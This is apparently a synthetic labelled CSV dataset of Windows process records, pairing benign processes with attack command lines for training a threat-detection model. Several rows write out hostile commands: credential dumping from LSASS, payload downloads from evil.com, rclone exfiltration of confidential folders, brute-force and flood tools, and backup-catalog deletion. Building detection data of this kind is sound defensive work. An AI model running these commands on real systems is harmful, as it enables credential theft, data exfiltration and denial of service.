process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
powershell.exe,powershell.exe,13.968880307454501,4.756932231973848,0,5,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,37.98274666197432,21.988377089477044,0,6,0,credential_dumping,mitre_credential_dumping,critical
svchost.exe,svchost.exe,3.1759447187790624,5.380490764994195,0,10,1,normal,synthetic_normal,
python.exe,python.exe,64.69225582841116,16.006883943274328,0,12,0,normal,synthetic_normal,
atexec.py,python atexec.py user:pass@target,33.34559432838898,14.843140956008462,1,7,0,lateral_movement,mitre_lateral_movement,high
hoic.exe,hoic.exe,92.61747617446576,32.0429600360676,1,1097,0,ddos,ddos_tools,
csrss.exe,csrss.exe,16.759922608497646,4.087867241908997,0,8,0,normal,synthetic_normal,
curl.exe,curl.exe -o malware.exe http://evil.com/payload,69.51802350902298,24.80136996724081,1,10,0,malware,mitre_download_execute,medium
SenseIR.exe,SenseIR.exe,23.308508149665172,2.0521573974361695,0,12,0,normal,synthetic_normal,
angry_ip_scanner.exe,angry_ip_scanner.exe,66.95147012131494,18.919575476477917,0,6,0,reconnaissance,mitre_network_scanning,low
javaw.exe,javaw.exe,15.56429500945076,2.225110365266586,0,9,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,97.25031184588556,36.13670536598458,1,1713,0,ddos,ddos_tools,
oracle.exe,oracle.exe,0.8848862973517091,5.606766406979764,0,2,0,normal,synthetic_normal,
SearchUI.exe,SearchUI.exe,0.043283420374867765,4.359515790912054,0,9,0,normal,synthetic_normal,
npx.exe,npx.exe,4.6549313493121725,4.871305315675516,1,20,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,85.35705853008008,15.442583668574091,1,479,0,brute_force,brute_force_tools,
kerbrute.exe,kerbrute.exe userenum users.txt,44.18935703825717,6.66028962683148,1,7,0,reconnaissance,mitre_reconnaissance,high
procexp.exe,procexp.exe,15.473087462736771,2.279285587170719,0,15,0,normal,synthetic_normal,
MsMpEng.exe,MsMpEng.exe,44.09686377542513,3.2574755547786403,1,1,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,92.52912543001423,18.000610702728892,1,79,0,brute_force,brute_force_tools,
csc.exe,csc.exe,9.053043653302355,2.10147695786714,0,11,0,normal,synthetic_normal,
procdump.exe,procdump.exe -ma lsass.exe,47.77557072721497,6.4604743883104,1,2,0,credential_dumping,mitre_credential_dumping,critical
msiexec.exe,msiexec.exe,4.985755596298857,6.585947378191849,0,15,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,4.196475559297879,4.959456236758159,0,10,0,normal,synthetic_normal,
curl.exe,curl.exe -o malware.exe http://evil.com/payload,38.15815056321391,19.463758215908484,1,1,0,malware,mitre_download_execute,medium
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,60.69325058583319,11.873179867094528,1,422,0,brute_force,brute_force_tools,
vlc.exe,vlc.exe,28.8578203723121,6.407633329033804,0,10,0,normal,synthetic_normal,
ethminer.exe,ethminer.exe --silent,66.34038933346002,30.524315948758254,1,28,0,ddos,known_malware,
Dropbox.exe,Dropbox.exe,1.9480066672224594,7.674196731152089,0,18,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,11.114147913633266,4.258676946015481,0,18,0,normal,synthetic_normal,
gpg-agent.exe,gpg-agent.exe,15.045443873456662,4.491349630727586,0,9,0,normal,synthetic_normal,
ShellExperienceHost.exe,ShellExperienceHost.exe,25.67435841392554,4.471061590240016,0,8,0,normal,synthetic_normal,
SearchUI.exe,SearchUI.exe,20.114486836365984,3.7724502981782417,0,0,0,normal,synthetic_normal,
hoic.exe,hoic.exe,91.55884329983625,11.393215366680543,1,110,0,ddos,ddos_tools,
python3.exe,python3.exe,13.52915444517261,3.6815215675849657,1,10,0,normal,synthetic_normal,
audiodg.exe,audiodg.exe,0.7808146305853825,3.5730402909588297,0,16,0,normal,synthetic_normal,
com.docker.backend.exe,com.docker.backend.exe,26.506382219429014,6.752405139244526,0,11,0,normal,synthetic_normal,
com.docker.proxy.exe,com.docker.proxy.exe,22.757838517426485,0.6909704862376033,0,5,0,normal,synthetic_normal,
tcpview.exe,tcpview.exe,20.25355754550272,5.411888415695636,0,6,0,normal,synthetic_normal,
tcpview.exe,tcpview.exe,27.74899975268729,3.3668391064204086,0,4,0,normal,synthetic_normal,
WINWORD.EXE,WINWORD.EXE,25.009733655797206,0.5962679768045951,0,0,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,29.348743468423105,2.13799111376048,0,8,0,normal,synthetic_normal,
ryuk.exe,ryuk.exe --silent,39.31864724142386,11.705134721328779,1,2,0,ransomware,known_malware,
pycharm64.exe,pycharm64.exe,9.824676514546027,4.185548162357799,0,10,0,normal,synthetic_normal,
nanocore.exe,nanocore.exe --silent,58.32450006731584,13.627448778555415,1,22,0,malware,known_malware,
powershell.exe,powershell.exe,9.378884004492424,3.502867583566056,1,7,0,normal,synthetic_normal,
npx.exe,npx.exe,20.38645987513839,4.547537169361678,1,9,0,normal,synthetic_normal,
Blender.exe,Blender.exe,1.042098258341928,4.52367088131342,0,11,0,normal,synthetic_normal,
lazagne.exe,lazagne.exe all,71.76506248864817,23.943122726368017,1,9,0,credential_dumping,mitre_credential_dumping,high
wininit.exe,wininit.exe,16.434699669353805,5.4760125479787245,0,14,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,1.6855365496382235,1.2253231564817684,0,1,0,normal,synthetic_normal,
wslg.exe,wslg.exe,24.993996778371876,6.696973024889411,0,3,0,normal,synthetic_normal,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,99.03069589239016,9.02891786489075,1,361,0,brute_force,brute_force_tools,
wsl.exe,wsl.exe,18.666839550762134,4.509824388070837,0,12,0,normal,synthetic_normal,
cargo.exe,cargo.exe,9.796777516269369,0.5446251853189977,0,20,0,normal,synthetic_normal,
vbc.exe,vbc.exe,15.947758628611442,4.340522151067371,0,1,0,normal,synthetic_normal,
javaw.exe,javaw.exe,11.30516087851015,2.931589324078529,1,0,0,normal,synthetic_normal,
npm.exe,npm.exe,13.91221916766869,5.683104649992239,0,16,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,63.93051026784751,9.752864597244827,1,211,0,brute_force,brute_force_tools,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",97.16629949505685,13.640876771880093,1,409,0,brute_force,brute_force_tools,
7z.exe,7z.exe a -ppassword archive.7z C:\Confidential,44.02816265526934,20.990261850384808,1,10,0,data_exfiltration,mitre_data_exfiltration,medium
com.docker.service.exe,com.docker.service.exe,6.126226872245361,7.159267721808835,0,16,0,normal,synthetic_normal,
rubeus.exe,rubeus.exe kerberoast,66.62803627781332,9.771349340945644,0,8,0,reconnaissance,mitre_reconnaissance,critical
SearchUI.exe,SearchUI.exe,17.173230713134036,2.0509629739447157,0,7,0,normal,synthetic_normal,
Memory Compression,Memory Compression,8.295181226453632,2.8764294142428657,0,11,0,normal,synthetic_normal,
sublime_text.exe,sublime_text.exe,2.271562288912561,1.664350843756756,0,19,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,21.932291621135008,0.7216270159583267,0,2,0,normal,synthetic_normal,
babuk.exe,babuk.exe --silent,74.117764830535,28.105723330509516,1,15,0,malware,known_malware,
MpCmdRun.exe,MpCmdRun.exe,23.663736734565056,1.5151055196150238,0,3,0,normal,synthetic_normal,
ssh.exe,ssh.exe,8.312911038860848,2.6834913475990487,1,9,0,normal,synthetic_normal,
cpuminer.exe,cpuminer.exe --silent,64.5898243970899,32.49164315275243,1,23,0,ddos,known_malware,
hancitor.exe,hancitor.exe --silent,40.90963080888938,11.792104174215863,1,17,0,malware,known_malware,
ZoomIt.exe,ZoomIt.exe,13.547690781263517,4.660657855429319,0,2,0,normal,synthetic_normal,
psexec64.exe,psexec64.exe -accepteula \\target,32.07295807937055,8.863209291716256,1,6,0,lateral_movement,mitre_lateral_movement,high
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,24.224190349244868,22.238526858662432,1,5,0,data_exfiltration,mitre_data_exfiltration,critical
psexec.exe,psexec.exe \\target -s cmd.exe,31.830113116331404,16.52830867574587,1,7,0,lateral_movement,mitre_lateral_movement,high
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,86.90412941712661,14.401847099769002,1,1087,0,ddos,ddos_tools,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,76.68980625366686,13.640459022360293,1,133,0,brute_force,brute_force_tools,
MSACCESS.EXE,MSACCESS.EXE,2.6570444943676144,3.266558924074008,0,7,0,normal,synthetic_normal,
csc.exe,csc.exe,16.401516541525428,6.994080169766114,0,1,0,normal,synthetic_normal,
javaws.exe,javaws.exe,18.05119978150055,2.417616019373628,0,19,0,normal,synthetic_normal,
pnpm.exe,pnpm.exe,20.728213218582788,7.756007510584716,1,15,0,normal,synthetic_normal,
conti.exe,conti.exe --silent,84.11527862925354,35.091489386155104,1,1,0,ransomware,known_malware,
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,50.021369893276756,15.685563962813623,0,6,0,malware,mitre_download_execute,high
stress.exe,stress.exe --cpu 8 --io 4,92.808160364787,18.81300622889146,1,720,0,ddos,ddos_tools,
slowloris.py,python slowloris.py target.com,80.66398402547748,16.02441925808333,1,599,0,ddos,ddos_tools,
rustup.exe,rustup.exe,4.262782111409187,0.5129493223547859,1,8,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,82.82753543273259,36.05796034367196,1,980,0,ddos,ddos_tools,
MSACCESS.EXE,MSACCESS.EXE,7.3679591389124175,6.158031180247905,0,16,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,98.5652889671159,32.29808330620435,1,1640,0,ddos,ddos_tools,
msiexec.exe,msiexec.exe,9.708229873867735,3.6180482357841424,0,8,0,normal,synthetic_normal,
wscript.exe,wscript.exe //E:vbscript malware.txt,64.03063406146207,9.453999535474845,0,4,0,malware,mitre_malicious_scripts,medium
notepad.exe,notepad.exe,9.844907792695423,1.1200093388570835,0,1,0,normal,synthetic_normal,
certutil.exe,certutil.exe -decode encoded.txt malware.exe,42.28138105576806,15.137769392898239,0,6,0,malware,mitre_download_execute,high
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,80.2369808627523,10.255132218644162,1,1505,0,ddos,ddos_tools,
hoic.exe,hoic.exe,85.09928285486127,20.04626436691709,1,712,0,ddos,ddos_tools,
pingcastle.exe,pingcastle.exe --healthcheck,41.0019657671662,10.833484417127142,1,1,0,reconnaissance,mitre_reconnaissance,medium
redis-server.exe,redis-server.exe,12.366716259731326,5.8665548180649445,0,11,0,normal,synthetic_normal,
SecurityHealthHost.exe,SecurityHealthHost.exe,9.873977135754668,4.2704744006629385,1,1,0,normal,synthetic_normal,
audiodg.exe,audiodg.exe,9.347038737720059,3.9204161922209457,0,20,0,normal,synthetic_normal,
ursnif.exe,ursnif.exe --silent,62.26953546225613,22.70272786642399,1,22,0,malware,known_malware,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,91.80366587154973,14.073801785837563,1,183,0,brute_force,brute_force_tools,
netwire.exe,netwire.exe --silent,54.82723875789709,31.37511763151084,1,12,0,malware,known_malware,
rar.exe,rar.exe a -hp archive.rar C:\Data,58.37859814875944,14.953011153351694,1,3,0,data_exfiltration,mitre_data_exfiltration,medium
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,57.47001835999973,16.645583858127896,1,72,0,brute_force,brute_force_tools,
nmap.exe,nmap.exe -p- --min-rate 1000,44.55653241704721,14.643759175734504,1,49,0,reconnaissance,mitre_network_scanning,medium
wslhost.exe,wslhost.exe,6.099935812017488,4.497774943937422,0,5,0,normal,synthetic_normal,
spoolsv.exe,spoolsv.exe,10.327650822764529,5.173935129663717,0,2,0,normal,synthetic_normal,
pingcastle.exe,pingcastle.exe --healthcheck,57.68251980523776,12.09364179239562,1,9,0,reconnaissance,mitre_reconnaissance,medium
MSACCESS.EXE,MSACCESS.EXE,22.315933616201097,4.158034728392664,0,15,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,27.79701205736603,3.7633485915904354,0,17,0,normal,synthetic_normal,
pythonw.exe,pythonw.exe,26.973814641883717,3.3286947955170243,0,12,0,normal,synthetic_normal,
powershell.exe,powershell.exe,7.261133039063629,6.062589854796569,0,13,0,normal,synthetic_normal,
powershell.exe,powershell.exe Invoke-Mimikatz,72.53550282743555,17.633609603478728,1,9,0,malware,mitre_malicious_scripts,critical
g++.exe,g++.exe,5.269388845071581,2.5474588197710832,0,12,0,normal,synthetic_normal,
pwsh.exe,pwsh.exe,25.85801291930998,1.3389608434042617,0,19,0,normal,synthetic_normal,
powershell.exe,powershell.exe,1.660981286380726,6.297039304325698,1,0,0,normal,synthetic_normal,
dockerd.exe,dockerd.exe,22.569801311748055,5.345980322154834,1,3,0,normal,synthetic_normal,
wbadmin.exe,wbadmin.exe delete catalog -quiet,60.33603040750585,5.050733229239741,1,2,0,ransomware,mitre_ransomware,critical
nmap.exe,nmap.exe -sV -sC 192.168.1.0/24,58.605367406558706,14.063189171090688,1,33,0,reconnaissance,mitre_network_scanning,medium
MsSense.exe,MsSense.exe,26.472936938425477,1.96995726539903,0,13,0,normal,synthetic_normal,
mshta.exe,mshta.exe http://evil.com/payload.hta,68.04416941132529,14.416207571749538,1,4,0,malware,mitre_malicious_scripts,critical
Code.exe,Code.exe,2.358036140983689,0.7051853348260302,0,9,0,normal,synthetic_normal,
7zFM.exe,7zFM.exe,5.3579326415602,5.536661045615844,0,17,0,normal,synthetic_normal,
OUTLOOK.EXE,OUTLOOK.EXE,11.193974290402078,1.3553379936428496,1,19,0,normal,synthetic_normal,
SenseIR.exe,SenseIR.exe,14.831374634672793,7.994129349621898,0,20,0,normal,synthetic_normal,
safari.exe,safari.exe,28.80862744046836,7.206811997357108,0,10,0,normal,synthetic_normal,
adrecon.ps1,powershell.exe ./ADRecon.ps1,40.38128289901952,6.850358768875482,1,7,0,reconnaissance,mitre_reconnaissance,high
explorer32.exe,explorer32.exe --silent,94.70381793138677,25.92225839643482,1,12,0,trojan,known_malware,
hoic.exe,hoic.exe,94.93647721949006,19.368540357869456,1,433,0,ddos,ddos_tools,
procexp.exe,procexp.exe,12.435842647986224,4.20009629695096,0,11,0,normal,synthetic_normal,
mshta.exe,mshta.exe vbscript:Execute,32.493786542108026,11.185679815141603,1,4,0,malware,mitre_malicious_scripts,high
ssh-agent.exe,ssh-agent.exe,29.617833832871778,7.302819853083857,1,0,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,28.094552453725015,1.3677188593211262,0,15,0,normal,synthetic_normal,
csc.exe,csc.exe,2.821511867552603,7.207322381953766,0,17,0,normal,synthetic_normal,
MSBuild.exe,MSBuild.exe,63.66665972740876,31.190393722321293,0,7,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,84.95614905329892,19.606436008040426,1,1685,0,ddos,ddos_tools,
SearchUI.exe,SearchUI.exe,12.136171205928063,5.888499618236991,0,16,0,normal,synthetic_normal,
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,68.91029521898201,8.214059980741247,1,9,0,data_exfiltration,mitre_data_exfiltration,critical
smss.exe,smss.exe,22.259500753546178,4.198618063968599,1,15,0,normal,synthetic_normal,
lync.exe,lync.exe,16.225401900185844,2.318352122666874,0,10,0,normal,synthetic_normal,
egregor.exe,egregor.exe --silent,84.39349172622993,15.234544785406207,1,16,0,malware,known_malware,
mysql.exe,mysql.exe,29.9769385171937,7.922925889603823,1,1,0,normal,synthetic_normal,
npx.exe,npx.exe,13.371654648908383,4.306165750996495,0,19,0,normal,synthetic_normal,
pycharm64.exe,pycharm64.exe,28.347457294100813,1.8042508288320143,0,9,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,13.836401392281871,1.0215490503927085,0,2,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe lsadump::sam,40.11581607865561,13.256027469687854,0,8,0,credential_dumping,mitre_credential_dumping,critical
meterpreter,metsvc.exe,74.97389326055973,5.057292245628244,1,2,0,trojan,mitre_command_control,critical
tcpview.exe,tcpview.exe,27.29459746760926,2.6611032304714155,0,0,0,normal,synthetic_normal,
Skype.exe,Skype.exe,14.980913889875382,2.1554731700233507,0,12,0,normal,synthetic_normal,
lsass.exe,lsass.exe,14.621402064175692,2.0945584307976386,0,1,0,normal,synthetic_normal,
hoic.exe,hoic.exe,86.7205327676882,16.396118951341926,1,710,0,ddos,ddos_tools,
pythonw.exe,pythonw.exe,25.392399985814667,3.797886465848463,0,8,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,80.18131198235886,31.841700291400386,1,1866,0,ddos,ddos_tools,
stress.exe,stress.exe --cpu 8 --io 4,94.07681368599077,37.588433261773325,1,1772,0,ddos,ddos_tools,
ssh.exe,ssh.exe,17.183240477154904,1.4203718965813332,0,0,0,normal,synthetic_normal,
rottenpotato.exe,rottenpotato.exe,25.405390188753717,22.19736380457301,0,0,0,privilege_escalation,mitre_privilege_escalation,critical
make.exe,make.exe,2.9440058317298448,2.79545194618388,0,1,0,normal,synthetic_normal,
csc.exe,csc.exe,1.3277556383270073,5.6809911947681115,0,16,0,normal,synthetic_normal,
dotnet.exe,dotnet.exe,4.842736077709428,3.566447104281439,0,10,0,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,6.087894929547194,5.680720373374214,1,13,0,normal,synthetic_normal,
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,98.36067171877563,35.00153425737214,1,737,0,ddos,ddos_tools,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,59.74820340042938,10.240138666053076,1,106,0,brute_force,brute_force_tools,
SearchApp.exe,SearchApp.exe,5.940794336553376,7.987811952984621,0,6,0,normal,synthetic_normal,
sweetpotato.exe,sweetpotato.exe -p cmd.exe,47.63951066216666,24.518061786267445,1,6,0,privilege_escalation,mitre_privilege_escalation,critical
SyncThing.exe,SyncThing.exe,28.35211236827774,4.1929949470250785,0,6,0,normal,synthetic_normal,
mysql.exe,mysql.exe,7.162395477625838,1.8022964903007082,1,18,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,18.037781602383333,2.6085418271462135,0,15,0,normal,synthetic_normal,
wget.exe,wget.exe http://evil.com/malware.exe,22.4352753115624,13.727878090628531,1,1,0,malware,mitre_download_execute,medium
pythonw.exe,pythonw.exe,18.79005594627494,1.3270897157032828,1,10,0,normal,synthetic_normal,
MpCopyAccelerator.exe,MpCopyAccelerator.exe,29.677910678411035,1.4042189327604153,0,0,0,normal,synthetic_normal,
trickbot.exe,trickbot.exe --silent,72.36759083705118,17.854613137301705,1,25,0,malware,known_malware,
sihost.exe,sihost.exe,9.532506427398916,6.929255848683104,0,18,0,normal,synthetic_normal,
wmic.exe,wmic.exe /node:target process call create,21.59301944809741,11.184980738473499,1,9,0,lateral_movement,mitre_lateral_movement,high
ssh-add.exe,ssh-add.exe,3.096319665141476,6.547550337075469,0,12,0,normal,synthetic_normal,
powershell.exe,powershell.exe -ep bypass -file malware.ps1,23.458154649436235,16.491416991837596,1,6,0,malware,mitre_malicious_scripts,high
loic.exe,loic.exe --target 192.168.1.1 --port 80,83.91093763414648,26.401040842641045,1,499,0,ddos,ddos_tools,
netwire.exe,netwire.exe --silent,83.10489925614358,15.716708741023435,1,11,0,malware,known_malware,
conhost.exe,conhost.exe,16.011539616144862,2.5809716176791144,0,11,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,81.99180076964711,11.411892297205098,1,361,0,ddos,ddos_tools,
Dropbox.exe,Dropbox.exe,11.498123635613522,4.441329226065948,0,8,0,normal,synthetic_normal,
smartscreen.exe,smartscreen.exe,20.97724212286678,3.345046605193566,0,6,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,85.9714235475291,14.416956345860683,1,510,0,ddos,ddos_tools,
g++.exe,g++.exe,11.569098309780971,2.7414086622626743,1,3,0,normal,synthetic_normal,
mydoom.exe,mydoom.exe --silent,36.09805655772377,10.535313046685259,1,2,0,malware,known_malware,
ZoomIt.exe,ZoomIt.exe,28.022053780664645,1.0339543833950593,0,10,0,normal,synthetic_normal,
OneDrive.exe,OneDrive.exe,9.910693112268254,2.57613439390859,1,15,0,normal,synthetic_normal,
SenseIR.exe,SenseIR.exe,22.419605283598642,4.5142185124011664,0,7,0,normal,synthetic_normal,
WINWORD.EXE,WINWORD.EXE,22.842429123627298,7.699267388677197,1,6,0,normal,synthetic_normal,
empire,launcher.bat,42.926786033358276,23.330623211707096,1,1,0,trojan,mitre_command_control,critical
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,96.48486419454292,28.37323011658849,1,323,0,ddos,ddos_tools,
svchosts.exe,svchosts.exe --silent,60.252974469334106,18.921405273039483,1,23,0,trojan,known_malware,
pythonw.exe,pythonw.exe,14.324637130191899,4.817286055586441,0,3,0,normal,synthetic_normal,
powershell.exe,powershell.exe,10.91889771197723,5.06912692870884,0,17,0,normal,synthetic_normal,
powershell.exe,powershell.exe,29.53501848959735,7.379136166352781,0,7,0,normal,synthetic_normal,
msedge.exe,msedge.exe,36.7086201841768,17.64038364972553,0,0,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,84.50302578045539,11.946118585805156,1,455,0,brute_force,brute_force_tools,
csrss.exe,csrss.exe,5.310020646279971,1.3155781195287992,0,13,0,normal,synthetic_normal,
safari.exe,safari.exe,5.477332259113522,6.002995853363878,0,9,0,normal,synthetic_normal,
dwm.exe,dwm.exe,29.145197606225842,4.354479120488467,0,3,0,normal,synthetic_normal,
winrm.cmd,winrs -r:target cmd,56.991127123736604,6.158623328468962,1,0,0,lateral_movement,mitre_lateral_movement,medium
ProcessHacker.exe,ProcessHacker.exe,5.783504149054842,7.857645940040478,1,17,0,normal,synthetic_normal,
conhost.exe,conhost.exe,0.059883055901525095,1.7291926605560142,0,9,0,normal,synthetic_normal,
OBS64.exe,OBS64.exe,14.469795671993971,2.210322613179451,0,12,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,3.4302559438447666,2.0060096950171564,0,12,0,normal,synthetic_normal,
cscript.exe,cscript.exe //E:jscript payload.js,32.319482714361015,21.97284222735308,0,0,0,malware,mitre_malicious_scripts,medium
node.exe,node.exe,90.61813877757245,3.4807948120946035,0,16,0,normal,synthetic_normal,
sublime_text.exe,sublime_text.exe,15.216424805286081,0.5882118500875553,0,10,0,normal,synthetic_normal,
bfgminer.exe,bfgminer.exe --silent,91.63098426570676,17.926201976244084,1,22,0,ddos,known_malware,
meterpreter,metsvc.exe,74.66142268479113,14.761523484706844,1,9,0,trojan,mitre_command_control,critical
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,91.85997626969518,13.762866722518844,1,376,0,brute_force,brute_force_tools,
powershell.exe,powershell.exe -nop -w hidden -enc,44.174451016310954,5.548481966407008,0,10,0,malware,mitre_malicious_scripts,high
winlogon32.exe,winlogon32.exe --silent,39.694085665540825,13.966617709659221,1,7,0,malware,known_malware,
Illustrator.exe,Illustrator.exe,21.300381233696495,6.3697693004026945,0,8,0,normal,synthetic_normal,
svchost.exe,svchost.exe,23.378504212613393,4.71755295669007,0,14,1,normal,synthetic_normal,
explorer.exe,explorer.exe,24.7238104512681,5.308124270956925,0,15,0,normal,synthetic_normal,
hoic.exe,hoic.exe,95.5880781846121,21.657318625169797,1,721,0,ddos,ddos_tools,
mongod.exe,mongod.exe,16.637250334236914,3.638495789786295,0,9,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,16.00141578838788,2.2640221945614685,0,7,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,4.164330443729417,1.8541725540380565,0,6,0,normal,synthetic_normal,
MpCmdRun.exe,MpCmdRun.exe,16.602088776819006,0.9620278719860282,0,8,0,normal,synthetic_normal,
pycharm64.exe,pycharm64.exe,0.6948600908293479,2.112161030547193,0,7,0,normal,synthetic_normal,
sqlservr.exe,sqlservr.exe,1.3841613947268372,1.6564286191923487,0,5,0,normal,synthetic_normal,
taskhost.exe,taskhost.exe --silent,58.29821216605674,21.145749900180355,1,7,0,malware,known_malware,
MSACCESS.EXE,MSACCESS.EXE,4.9733695365055075,0.8172645208769651,1,3,0,normal,synthetic_normal,
7zG.exe,7zG.exe,21.438548390170915,3.501097906659761,0,9,0,normal,synthetic_normal,
fish.exe,fish.exe,14.534824648152991,1.2701247015816892,0,0,0,normal,synthetic_normal,
Registry,Registry,26.856587741076183,3.372907139983977,0,12,0,normal,synthetic_normal,
evil-winrm.rb,evil-winrm -i target -u user -p pass,30.975091859044415,13.736616487302843,1,6,0,lateral_movement,mitre_lateral_movement,critical
MSACCESS.EXE,MSACCESS.EXE,8.481783911645365,6.958931096577811,0,0,0,normal,synthetic_normal,
SgrmBroker.exe,SgrmBroker.exe,15.503194669388161,2.046590875338052,1,10,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,8.31605854053848,1.435426589973929,0,1,0,normal,synthetic_normal,
pycharm64.exe,pycharm64.exe,8.952915296990353,7.853111137037067,0,14,0,normal,synthetic_normal,
svchost32.exe,svchost32.exe --silent,73.73776143727017,31.634844558645618,1,26,0,malware,known_malware,
explorer.exe,explorer.exe,23.712067484156826,2.7920957526918793,0,7,0,normal,synthetic_normal,
msiexec.exe,msiexec.exe,9.033014139440606,4.6194775207507135,0,19,0,normal,synthetic_normal,
winpeas.exe,winpeas.exe,74.840531173905,22.487038793115488,0,7,0,privilege_escalation,mitre_privilege_escalation,high
notepad.exe,notepad.exe,5.438411150674467,0.9587026018124505,1,19,0,normal,synthetic_normal,
python3.11.exe,python3.11.exe,11.240242206025773,6.463574875609012,0,12,0,normal,synthetic_normal,
notpetya.exe,notpetya.exe --silent,79.06325947114878,24.54224981447654,1,29,0,malware,known_malware,
SearchApp.exe,SearchApp.exe,23.99069019676391,3.7978587265525836,1,12,0,normal,synthetic_normal,
vivaldi.exe,vivaldi.exe,7.714980387513205,0.6081036282966952,1,15,0,normal,synthetic_normal,
fish.exe,fish.exe,29.228653123282854,6.409542320225401,0,12,0,normal,synthetic_normal,
Slack.exe,Slack.exe,2.6608056021798356,7.125086883516366,0,14,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,83.66543726423447,9.541672090237387,1,58,0,brute_force,brute_force_tools,
pwsh.exe,pwsh.exe,11.835869369711347,4.067940709590978,0,12,0,normal,synthetic_normal,
njrat.exe,njrat.exe --silent,84.06412098457801,29.859086854497868,1,21,0,trojan,known_malware,
angry_ip_scanner.exe,angry_ip_scanner.exe,50.6312925349354,12.798125042594153,1,50,0,reconnaissance,mitre_network_scanning,low
winlogon32.exe,winlogon32.exe --silent,47.1914474696494,24.1241001355763,1,16,0,malware,known_malware,
slowloris.py,python slowloris.py target.com,98.29841581386648,30.56467096939661,1,1988,0,ddos,ddos_tools,
notepad++.exe,notepad++.exe,13.869122667417239,2.1764675424129654,0,15,0,normal,synthetic_normal,
Discord.exe,Discord.exe,3.2618079899122012,1.2619485692569858,1,10,0,normal,synthetic_normal,
goland64.exe,goland64.exe,10.484151185323618,7.606607837477689,1,15,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,99.68112623474761,29.290324083828484,1,589,0,ddos,ddos_tools,
